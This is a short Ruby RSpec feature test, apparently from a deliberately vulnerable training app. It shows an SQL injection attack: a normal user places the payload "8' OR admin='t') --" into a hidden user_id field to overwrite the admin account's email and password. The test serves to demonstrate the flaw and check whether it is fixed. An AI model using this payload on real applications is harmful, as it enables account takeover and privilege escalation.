require 'spec_helper'

feature 'sql injection' do
  before do
    UserFixture.reset_all_users
    @normal_user = UserFixture.normal_user
    @admin_user = User.where("admin='t'").first
  end

  scenario 'attack' do
    @admin_user.admin.should be_true

    login(@normal_user)

    visit "/users/#{@normal_user.user_id}/account_settings"
    within('#account_edit') do
      fill_in 'Email', :with => 'joe.admin@schmoe.com'
      fill_in 'user_password', :with => 'hacketyhack'
      fill_in 'user_password_confirmation', :with => 'hacketyhack'

      # this is a hidden field, so cannot use fill_in to access it.
      find(:xpath, "//input[@id='user_user_id']", :visible => false).set "8' OR admin='t') --"
    end
    click_on 'Submit'

    pending(:if => verifying_fixed?) {
      @admin_user = User.where("admin='t'").first
      @admin_user.email.should == 'joe.admin@schmoe.com'
      @admin_user.admin.should == true
    }
  end
end